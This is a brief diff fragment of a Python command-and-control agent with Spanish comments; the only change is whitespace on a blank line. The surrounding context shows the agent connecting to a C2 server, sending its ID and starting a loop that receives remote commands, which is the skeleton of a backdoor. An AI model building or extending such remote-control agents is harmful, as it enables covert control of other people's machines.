@@ -95,7 +95,7 @@ def connect_to_c2_server():
         agent_socket.connect((SERVER_IP, SOCKET_PORT))
         print(f"Agente {agent_id} conectado al servidor.")
         agent_socket.send(str(agent_id).encode('utf-8')) # Enviar el ID del agente al servidor
-
+        
         while True:
             command = agent_socket.recv(1024).decode('utf-8')
             if not command:
